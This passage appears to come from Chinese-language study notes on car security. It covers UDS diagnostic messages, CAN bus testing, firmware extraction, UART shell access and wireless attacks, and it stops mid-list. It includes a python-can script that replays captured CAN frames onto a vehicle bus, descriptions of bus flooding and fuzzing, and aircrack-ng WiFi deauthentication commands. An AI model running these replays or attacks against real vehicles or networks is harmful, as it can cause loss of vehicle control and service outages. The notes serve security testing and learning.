      <p>清除（复位）DTC格式，它可以改变DTC的状态。DTC状态中的八个位，除bit4和bit6外均会被清零，包含当前故障（TestFailed）和历史故障（ConfirmedDTC）。bit4和bit6这两个testNotCompleted开头的会被强制置1。3个FF代表清除所有DTC。</p>
<p>Request：   14 FF  FF  FF  AA  AA  AA</p>
<p>Response：54 AA AA AA AA  AA  AA</p>

        <h3 id="0x2F与IO控制相关服务"   >
          <a href="#0x2F与IO控制相关服务" class="heading-link"><i class="fas fa-link"></i></a><a href="#0x2F与IO控制相关服务" class="headerlink" title="0x2F与IO控制相关服务"></a>0x2F与IO控制相关服务</h3>
      <p>该服务可以通过DID(数据标识符)来进行输入信号的替换和控制零部件负载输出，这是一个用在产线上较多的服务。该报文的请求至少由4个字节组成。第一个字节是2F，第二第三字节是DID，其中第二字节是高位。第四字节是input Output Control Parameter（并不算一个子功能），可以看做IO控制类型。</p>
<ul>
<li><p>其中IO控制类型分为4类：</p>
<ul>
<li>00是控制权还给ECU，Return Control To ECU。</li>
<li>01是复位为默认值，Reset to Default。</li>
<li>02是冻结当前的状态，Freeze Current State。</li>
<li>03是短暂接管控制权，Short Term Adjustment。</li>
</ul>
<p>若控制类型是00-02这三种，请求报文是4个字节。若控制类型是03，请求报文的第五字节是控制代码，可以是数字量，比如01是开，00是关；也可以是模拟量，比如空调风门的开度。</p>
</li>
</ul>
<p>例子如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">05 2F DD DD 03 00 AA AA ----03 00代表关闭开关</span><br><span class="line">05 6F DD DD 03 00 AA AA ----ECU的肯定回复</span><br><span class="line">05 2F DD DD 03 01 AA AA ----03 01 代表开启开关</span><br><span class="line">05 6F DD DD 03 01 AA AA ----ECU的肯定回复</span><br><span class="line">04 2F DD DD 00 AA AA AA ----将控制权还给ECU</span><br><span class="line">05 6F DD DD 00 02 AA AA ----ECU的肯定回复</span><br><span class="line">04 2F DD DD 01 AA AA AA ----复位IO为默认值</span><br><span class="line">03 7F 2F 22 AA AA AA AA ----ECU否定回复，不支持</span><br></pre></td></tr></table></div></figure>

<p>其中DD代表DID（Data Identifier）数据标识符</p>

        <h1 id="CAN总线测试"   >
          <a href="#CAN总线测试" class="heading-link"><i class="fas fa-link"></i></a><a href="#CAN总线测试" class="headerlink" title="CAN总线测试"></a>CAN总线测试</h1>
      
        <h2 id="1-总线入口"   >
          <a href="#1-总线入口" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-总线入口" class="headerlink" title="1.总线入口"></a>1.总线入口</h2>
      <p>CAN总线接入口在主驾驶和副驾驶的OBD口中接入；</p>
<p>OBD-II接口一般位于主驾和副驾的前脚下方。可用OBD-II接口信号转接器将信号转接出来，方便后面使用CAN-USB等硬件来选择接入不同的CAN总线</p>

        <h2 id="2-虚拟测试"   >
          <a href="#2-虚拟测试" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-虚拟测试" class="headerlink" title="2.虚拟测试"></a>2.虚拟测试</h2>
      <p>在ubuntu上新建虚拟的CAN口进行测试</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ip link add dev vcan0 type vcan</span><br><span class="line">sudo ip link set up vcan0</span><br></pre></td></tr></table></div></figure>

<p>然后使用candump，cansend即可</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">candump vcan0</span><br><span class="line">cansend vcan0 7df#0210010000000000</span><br></pre></td></tr></table></div></figure>

<p>对应的python-can脚本为</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> can</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_can_message</span>(<span class="params">bus, message_id, data</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;发送CAN报文&quot;&quot;&quot;</span></span><br><span class="line">    msg = can.Message(arbitration_id=message_id, data=data, is_extended_id=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        bus.send(msg)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Message sent on <span class="subst">&#123;bus.channel_info&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> can.CanError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Message NOT sent&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">receive_can_message</span>(<span class="params">bus, expected_id</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;接收特定ID的CAN报文&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        message = bus.recv(<span class="number">10.0</span>)  <span class="comment"># 等待最多10秒</span></span><br><span class="line">        <span class="keyword">if</span> message <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">if</span> message.arbitration_id == expected_id:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Received message: <span class="subst">&#123;message&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Timeout occurred, no message received&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># 配置CAN接口，这需要根据您的CANoe配置来设置</span></span><br><span class="line">    <span class="comment">#bus = can.interface.Bus(interface=&#x27;pcan&#x27;, channel=&#x27;PCAN_USBBUS1&#x27;, bitrate=125000)</span></span><br><span class="line">    bus = can.interface.Bus(interface=<span class="string">&#x27;socketcan&#x27;</span>, channel=<span class="string">&#x27;vcan0&#x27;</span>, bitrate=<span class="number">125000</span>)</span><br><span class="line">    <span class="comment"># 发送的CAN报文</span></span><br><span class="line">    send_id = <span class="number">0x7a0</span></span><br><span class="line">    send_data = [<span class="number">0x02</span>, <span class="number">0x10</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line">    send_can_message(bus, send_id, send_data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 等待并打印响应报文</span></span><br><span class="line">    receive_id = <span class="number">0x7a8</span></span><br><span class="line">    receive_can_message(bus, receive_id)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></div></figure>




        <h2 id="3-测试"   >
          <a href="#3-测试" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-测试" class="headerlink" title="3.测试"></a>3.测试</h2>
      
        <h3 id="1-工具"   >
          <a href="#1-工具" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-工具" class="headerlink" title="(1)工具"></a>(1)工具</h3>
      <p>将CAN总线与测试工具相连接，然后通过工具的USB口接入电脑</p>

        <h4 id="a-CANalyst-II"   >
          <a href="#a-CANalyst-II" class="heading-link"><i class="fas fa-link"></i></a><a href="#a-CANalyst-II" class="headerlink" title="a)CANalyst-II"></a>a)CANalyst-II</h4>
      <p>与该工具匹配的软件是CANPro，需要安装USB_CAN TOOL这款驱动软件，CANpro才能正常运行</p>

        <h4 id="b-PCAN-USB"   >
          <a href="#b-PCAN-USB" class="heading-link"><i class="fas fa-link"></i></a><a href="#b-PCAN-USB" class="headerlink" title="b)PCAN-USB"></a>b)PCAN-USB</h4>
      <p>与该工具匹配的软件是PCAN-View，需要安装PeakOemDrv这款驱动软件，PCAN-View才 能正常运行。</p>

        <h4 id="c-CANoe"   >
          <a href="#c-CANoe" class="heading-link"><i class="fas fa-link"></i></a><a href="#c-CANoe" class="headerlink" title="c)CANoe"></a>c)CANoe</h4>
      <p>与该工具匹配的软件同样也叫做CANoe，需要安装对应的驱动</p>

        <h4 id="d-Can-utils"   >
          <a href="#d-Can-utils" class="heading-link"><i class="fas fa-link"></i></a><a href="#d-Can-utils" class="headerlink" title="d)Can-utils"></a>d)Can-utils</h4>
      <p>一款安装在kali中的can渗透工具包，包含了许多CAN总线测试工具，比如candump、cansend、cansniffer、canplayer等。</p>
<ul>
<li>输入<code>candump can0 –l </code>命令监听can总线数据并生成数据包</li>
<li><code>canplayer -I candump-xxxx-xx-xx_xxxx.log</code>：发送监听保存的总线数据包</li>
</ul>

        <h3 id="2-攻击测试"   >
          <a href="#2-攻击测试" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-攻击测试" class="headerlink" title="(2)攻击测试"></a>(2)攻击测试</h3>
      
        <h4 id="a-CAN重放攻击"   >
          <a href="#a-CAN重放攻击" class="heading-link"><i class="fas fa-link"></i></a><a href="#a-CAN重放攻击" class="headerlink" title="a)CAN重放攻击"></a>a)CAN重放攻击</h4>
      <p>监听捕获can总线数据上的包，特别是控车指令包，再重放，查看车身有无异常响应。</p>

        <h4 id="b-CAN拒绝服务测试"   >
          <a href="#b-CAN拒绝服务测试" class="heading-link"><i class="fas fa-link"></i></a><a href="#b-CAN拒绝服务测试" class="headerlink" title="b)CAN拒绝服务测试"></a>b)CAN拒绝服务测试</h4>
      <p>发送大量仲裁包，使总线拒绝服务，不能再单独发数据包</p>

        <h4 id="c-CAN总线模糊测试"   >
          <a href="#c-CAN总线模糊测试" class="heading-link"><i class="fas fa-link"></i></a><a href="#c-CAN总线模糊测试" class="headerlink" title="c)CAN总线模糊测试"></a>c)CAN总线模糊测试</h4>
      <p>将CANalyst-II接入车身CAN总线，发送大量递归数据包，其中的异常包会使车辆失控，车窗，车灯，雨刷等开始不受控。</p>

        <h2 id="4-CAN重放逆向"   >
          <a href="#4-CAN重放逆向" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-CAN重放逆向" class="headerlink" title="4.CAN重放逆向"></a>4.CAN重放逆向</h2>
      <p>连接PCAN，导入.asc文件即可</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">This example shows how sending a single message works.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> can</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment"># Function to parse a line of the log file into a CAN message</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_can_message</span>(<span class="params">line</span>):</span></span><br><span class="line">    <span class="comment"># Regular expression to match the structure of a CAN message in the log</span></span><br><span class="line">    can_msg_pattern = <span class="string">r&#x27;(\s*\d+\.\d+)\s+\d+\s+([0-9A-F]+)x\s+Rx\s+d\s+(\d+)\s+([0-9A-F ]+)&#x27;</span></span><br><span class="line"></span><br><span class="line">    match = re.match(can_msg_pattern, line)</span><br><span class="line">    <span class="keyword">if</span> match:</span><br><span class="line">        timestamp = <span class="built_in">float</span>(match.group(<span class="number">1</span>))</span><br><span class="line">        message_id = <span class="built_in">int</span>(match.group(<span class="number">2</span>), <span class="number">16</span>)</span><br><span class="line">        dlc = <span class="built_in">int</span>(match.group(<span class="number">3</span>))</span><br><span class="line">        data = <span class="built_in">bytes</span>(<span class="built_in">int</span>(byte, <span class="number">16</span>) <span class="keyword">for</span> byte <span class="keyword">in</span> match.group(<span class="number">4</span>).split())</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&#x27;timestamp&#x27;</span>: timestamp,</span><br><span class="line">            <span class="string">&#x27;message_id&#x27;</span>: message_id,</span><br><span class="line">            <span class="string">&#x27;dlc&#x27;</span>: dlc,</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span>: data</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_can_message</span>(<span class="params">bus, message_id, data</span>):</span></span><br><span class="line">    msg = can.Message(arbitration_id=message_id, data=data, is_extended_id=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        bus.send(msg)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Message sent on <span class="subst">&#123;bus.channel_info&#125;</span>: ID=<span class="subst">&#123;message_id&#125;</span>, Data=<span class="subst">&#123;data&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> can.CanError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Message NOT sent&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Parse the log file</span></span><br><span class="line">file_path = <span class="string">&#x27;/home/hacker/Desktop/Work/CAN/25sa.asc&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    lines = file.readlines()</span><br><span class="line">parsed_messages = [parse_can_message(line) <span class="keyword">for</span> line <span class="keyword">in</span> lines <span class="keyword">if</span> parse_can_message(line) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bus = can.interface.Bus(interface=<span class="string">&#x27;pcan&#x27;</span>, channel=<span class="string">&#x27;PCAN_USBBUS1&#x27;</span>, bitrate=<span class="number">125000</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> msg <span class="keyword">in</span> parsed_messages:</span><br><span class="line">    pause()</span><br><span class="line">    <span class="comment">#print(&quot;enter to send!&quot;)</span></span><br><span class="line">    send_can_message(bus, msg[<span class="string">&#x27;message_id&#x27;</span>], msg[<span class="string">&#x27;data&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>然后依次重放每一个包，分析哪个包是指定的包。</p>

        <h3 id="防止重放："   >
          <a href="#防止重放：" class="heading-link"><i class="fas fa-link"></i></a><a href="#防止重放：" class="headerlink" title="防止重放："></a>防止重放：</h3>
      
        <h1 id="LIN总线协议"   >
          <a href="#LIN总线协议" class="heading-link"><i class="fas fa-link"></i></a><a href="#LIN总线协议" class="headerlink" title="LIN总线协议"></a>LIN总线协议</h1>
      <p>专门为汽车开发的低成本串行通信网络，传输速率20Kb/s，通常一个LIN上节点数目小于12个，共有64个标识符</p>

        <h1 id="车载固件"   >
          <a href="#车载固件" class="heading-link"><i class="fas fa-link"></i></a><a href="#车载固件" class="headerlink" title="车载固件"></a>车载固件</h1>
      <p>固件通常由bootloader、内核、根文件系统及其他资源组成，根据嵌入式linux、嵌入式windows（WinCE）、windowsIOT内核及各种实时操作系统（RTOS）的区别，固件也有多种类型。</p>

        <h2 id="1-获取车载固件"   >
          <a href="#1-获取车载固件" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-获取车载固件" class="headerlink" title="1.获取车载固件"></a>1.获取车载固件</h2>
      <p>没有车的情况下获取固件</p>
<ul>
<li><p>官网提供升级固件</p>
</li>
<li><p>硬件调试接口JTAG获取固件</p>
</li>
<li><p>读取Flash芯片获取固件</p>
</li>
<li><p>通过串口获取车机系统Shell权限，进而对固件进行打包</p>
</li>
<li><p>利用车机固件更新API，从云端获取更新固件</p>
</li>
<li><p>云端信息泄露，如FTP弱口令或未授权接口获取车机固件</p>
</li>
</ul>

        <h2 id="2-提取固件"   >
          <a href="#2-提取固件" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-提取固件" class="headerlink" title="2.提取固件"></a>2.提取固件</h2>
      
        <h3 id="提取方式"   >
          <a href="#提取方式" class="heading-link"><i class="fas fa-link"></i></a><a href="#提取方式" class="headerlink" title="提取方式"></a>提取方式</h3>
      <p>(1)车机有wifi功能，通过工程模式开启wifi热点，WiFi→FTP/TFTP→PC</p>
<p>在无线层面获取固件，是最理想的情况，这代表了根源的纯洁，固件还没有刷写入车机，其加密，校验，认证机制都是完整存在。</p>
<p>通常手段如下</p>
<ul>
<li>FOTA下发升级过程中截取整个网段流量，从中打包逆向出升级固件包—— 已经非常少见，FOTA传输路径成熟，无法监听获取流量</li>
<li>通过组网车载网络（wifi，热点，车载以太网），从端口接入系统，直接导出系统内的固件文件——  前置条件是OTA的传输固件包有存储路径，否则只能导出来已经刷写好的系统组件，adb，ssh，nc，scp</li>
</ul>
<p>(2)通过串口文件传输协议，直接提取固件，Uart→Xmodem/Ymodem/Zmodem→PC</p>
<p>物理层面的获取固件是可行性最大的，使用的硬件道具：jlink，ST-link，RT809，常用手段如下：</p>
<ul>
<li>串口通信传输：JTAG，SPI，SWD</li>
<li>芯片提取：编程器</li>
</ul>
<p>使用的硬件道具：jlink，ST-link，RT809</p>

        <h3 id="串口传输协议"   >
          <a href="#串口传输协议" class="heading-link"><i class="fas fa-link"></i></a><a href="#串口传输协议" class="headerlink" title="串口传输协议"></a>串口传输协议</h3>
      
        <h4 id="Xmodem"   >
          <a href="#Xmodem" class="heading-link"><i class="fas fa-link"></i></a><a href="#Xmodem" class="headerlink" title="Xmodem:"></a>Xmodem:</h4>
      <p>异步文件传输协议。分为标准Xmodem和1k-Xmodem两种，前者以128字节块的形式传输数据，后者字节块为1k即1024字节，并且每个块都使用一个校验和过程来进行错误检测。在校验过程中如果接收方关于一个块的校验和与它在发送方的校验和相同时，接收方就向发送方发送一个确认字节(ACK)。由于Xmodem需要对每个块都进行认可，这将导致性能有所下降，特别是延时比较长的场合，这种协议显得效率更低。</p>
<p>一个完整的数据帧一共132字节，其中包含128字节数据，数据帧以固定3字节帧头开始</p>
<ul>
<li>第一个是控制字符SOH（0x01）</li>
<li>第二个是数据帧序号</li>
<li>第三个是数据帧序号反码</li>
<li>第四个是数据帧固定长度为128，不足128为使用CTRLZ（0X1A）进行补齐</li>
<li>第五个是校验和</li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/6-1634876115.png" alt="6-1634876115"></p>

        <h4 id="Ymodem"   >
          <a href="#Ymodem" class="heading-link"><i class="fas fa-link"></i></a><a href="#Ymodem" class="headerlink" title="Ymodem"></a>Ymodem</h4>
      <p>Xmodem改良版，它可以一次传输1024字节的信息块，同时还支持传输多个文件。</p>
<ul>
<li>第一个是控制字符SOH（0x01）</li>
<li>第二个是数据帧序号</li>
<li>第三个是数据帧序号反码</li>
<li>第四个是传输的文件名filename</li>
<li>第五个是传输的大小filesize</li>
<li>第六个是NULL部分，数据部分的128字节减去filename和filesize，剩下的用00填充</li>
<li>第七个是校验和CRC</li>
</ul>

        <h4 id="Zmodem"   >
          <a href="#Zmodem" class="heading-link"><i class="fas fa-link"></i></a><a href="#Zmodem" class="headerlink" title="Zmodem"></a>Zmodem</h4>
      <p>采用串流传输方式，传输速度最快。Zmodem数据帧：ZPAD + ZDLE + A + frame-type ZF3 ZF2 ZF1 ZF0 CRC-1 CRC-2</p>
<ul>
<li><p>ZPAD+ZDLE：帧头</p>
</li>
<li><p>A：报头的数据是二进制格式</p>
</li>
<li><p>frame-type：帧类型</p>
</li>
<li><p>ZF3 ZF2 ZF1 ZF0：4个字节信息</p>
</li>
<li><p>CRC-1 CRC-2：校验和</p>
</li>
</ul>
<p>支持这三种协议的工具分别是minicom和SecureCRT。</p>
<p>通过使用SecureCRT可以直接下载或上传文件，如果芯片系统里存在lrzsz，可以直接用Zmodem进行传输。</p>
<p>使用<code>sz filename</code>即可开始下载</p>

        <h2 id="3-获取Shell"   >
          <a href="#3-获取Shell" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-获取Shell" class="headerlink" title="3.获取Shell"></a>3.获取Shell</h2>
      <p>硬件都会有调试接口，就是Uart。</p>
<p>Uart:通用异步收发传输器，是一种串行异步收发协议，应用十分广泛。Uart工作原理是将数据的二进制位一位一位的进行传输。在UART通讯协议中信号线上的状态位高电平代表’1’低电平代表’0’。当然两个设备使用UART串口通讯时，必须先约定好传输速率，也就是波特率。</p>
<p>典型的波特率有这些：300，1200，2400，9600，19200，38400，115200。（上述波特率并不全）</p>
<p>如果试过每一个波特率还是无法接收到可见字符，可能是两个问题：</p>
<ul>
<li><p>找错了串口</p>
</li>
<li><p>可能它本身传输的数据是不可见字符</p>
</li>
</ul>
<p>连接Uart需要三根线，分别是：</p>
<ul>
<li><p>TX：发送数据端，要接对面设备的RX</p>
</li>
<li><p>RX：接收数据端，要接对面设备的TX</p>
</li>
<li><p>GND：保证两设备共地，有统一的参考平面</p>
</li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230708170412699.png" alt="image-20230708170412699"></p>

        <h1 id="车载无线通信"   >
          <a href="#车载无线通信" class="heading-link"><i class="fas fa-link"></i></a><a href="#车载无线通信" class="headerlink" title="车载无线通信"></a>车载无线通信</h1>
      <p>车载无线通讯技术由车载导航模块、车载无线通信模块、安全报警模块、行车状态记录模块、多媒体播放模块、数据采集模块、语音识别模块、地理信息系统模块八部分组成。所有的数据都通过车载信息中心进行处理、协调，并做出正确的反应。</p>

        <h2 id="1-WIFI"   >
          <a href="#1-WIFI" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-WIFI" class="headerlink" title="1.WIFI"></a>1.WIFI</h2>
      <p>最常见的Wi-Fi安全类型是WEP，WPA和WPA2。</p>
<ul>
<li><p>WPA2：带来了另外一系列安全和加密升级，最值得注意的是将高级加密标准（AES）引入消费者Wi-Fi网络。AES比RC4强得多（因为RC4已被多次破解），并且是当前许多在线服务所采用的安全标准。</p>
</li>
<li><p>WPA3：已经推出，目前是最高的安全等级，尚未暴露危险，WPA3为标准增加了更强大的192位加密</p>
</li>
</ul>

        <h3 id="测试工具"   >
          <a href="#测试工具" class="heading-link"><i class="fas fa-link"></i></a><a href="#测试工具" class="headerlink" title="测试工具"></a>测试工具</h3>
      <ul>
<li>Aircrack：Aircrack是目前最流行的WiFi密码破解工具。市面上能破解 WiFi加密的工具有很多，不外乎利用WEP安全漏洞或者暴力字典攻击的方式破解WPA/WPA2 PSK密码。WPA2 AES/CCMP加密依然是相对安全的选择。如果采用WPA2 PSK模式，那么你的密码长度最好是13位以上混合字符。在你的Wi-Fi网络被入侵或者“蹭网”之前，最好先用破解工具自我攻击一下。 Aircrack是一个开源的WEP/WPA/WPA2 PSK破解工具，可以运行在windows、Mac OS X、Linux和OpenBSD上。可以下载到Vmware镜像文件或Live CD文件。</li>
<li>Kismet：Kismet是一个开源的WiFi扫描器，包嗅探器和入侵政策系统，可以在windows、Mac OSX、Linux和BSD上运行。Kismet能显示AP详细信息，包括隐藏的SSID，还能捕获原始无线数据包，还可以将数据导入 Wireshark、TCPdump等工具进行分析。在windows环境，受驱动程序限制，Kismet只能与 CACE AirPcap无线网卡配合工作。但在Mac OSX和Linux上，Kismet可以兼容很多无线网卡</li>
<li>Wifiphisher：开源无线安全工具Wifiphisher能够对WPA加密的AP无线热点实施自动化钓鱼攻击，获取密码账户。由于利用了社工原理实施中间人攻击，Wifiphisher在实施攻击时无需进行暴力破解。WiFiphiser是基于MIT许可模式的开源软件，运行于Kali Linux之上。</li>
</ul>

        <h3 id="WIFI-deauth攻击"   >
          <a href="#WIFI-deauth攻击" class="heading-link"><i class="fas fa-link"></i></a><a href="#WIFI-deauth攻击" class="headerlink" title="WIFI deauth攻击"></a>WIFI deauth攻击</h3>
      <p>1.将无线网卡接入测试电脑Linux虚拟机（装有Aircrack-ng）</p>
<p>2.测试电脑使用Linux虚拟机</p>
<p>3.在kali的命令行中输入ifconfig，查看无线网卡是否成功连接至系统（出现了名为wlan0的无线网卡则是成功连接）</p>
<p>4.使用命令ifconfig wlan0 up启用无线网卡</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230709144403979.png" alt="image-20230709144403979"></p>
<p>5.使用命令airmon-ng start wlan0 将网卡设置为监听模式（开启混杂模式才能嗅探所有经过网卡的数据包）</p>
<p>6.使用命令ifconfig查看网卡是否开启监听模式</p>
<p>7.监听模式开启成功后，使用命令airodump-ng wlan0对当前环境的无线网络进行嗅探，根据SSID确认攻击目标，并记录目标MAC（mon0为激活监听模式的无线网卡名称）</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230709144416743.png" alt="image-20230709144416743"></p>
<p>8.使用命令aireplay-ng -0 100 –a AP的mac wlan0进行DeAuth攻击（-0 采用deauth攻击模式，100为攻击次数，-a 后跟AP的MAC地址，-c 后跟客户端的MAC地址）</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230709144430217.png" alt="image-20230709144430217"></p>
<p>在攻击期间内，目标热点断开即为攻击成功</p>

        <h2 id="2-蓝牙"   >
          <a href="#2-蓝牙" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-蓝牙" class="headerlink" title="2.蓝牙"></a>2.蓝牙</h2>
      
        <h3 id="攻击类型"   >
          <a href="#攻击类型" class="heading-link"><i class="fas fa-link"></i></a><a href="#攻击类型" class="headerlink" title="攻击类型"></a>攻击类型</h3>
      <p>1、无ping码认证，设备冒充，获取车辆蓝牙连接，导致传输文件，播放音频，获取蓝牙日志存储</p>
<p>2、蓝牙dos攻击，使蓝牙无法连接，功能异常</p>
<p>3、蓝牙重放攻击，蓝牙钥匙控制指令泄露并重放</p>

        <h3 id="测试工具-1"   >
          <a href="#测试工具-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#测试工具-1" class="headerlink" title="测试工具"></a>测试工具</h3>
      <p>BtleJuice框架：</p>
<p>BLE-Replay：</p>

        <h2 id="3-射频中继劫持"   >
          <a href="#3-射频中继劫持" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-射频中继劫持" class="headerlink" title="3.射频中继劫持"></a>3.射频中继劫持</h2>
      <p>除开WIFI和蓝牙，整车还存在射频中继，GPS劫持，或者全频率干扰</p>
<p>车身的各类功能性频率都可以存在漏洞利用，tpms检测干扰，PEPS开车重置，车门钥匙死锁，甚至使板件波形破译，都存在问题</p>

        <h1 id="智能网联汽车安全"   >
          <a href="#智能网联汽车安全" class="heading-link"><i class="fas fa-link"></i></a><a href="#智能网联汽车安全" class="headerlink" title="智能网联汽车安全"></a>智能网联汽车安全</h1>
      
        <h2 id="1-智能汽车"   >
          <a href="#1-智能汽车" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-智能汽车" class="headerlink" title="1.智能汽车"></a>1.智能汽车</h2>
      <p>不同厂商的车联网实现架构不同，但总体架构可分为4部分：</p>
<ul>
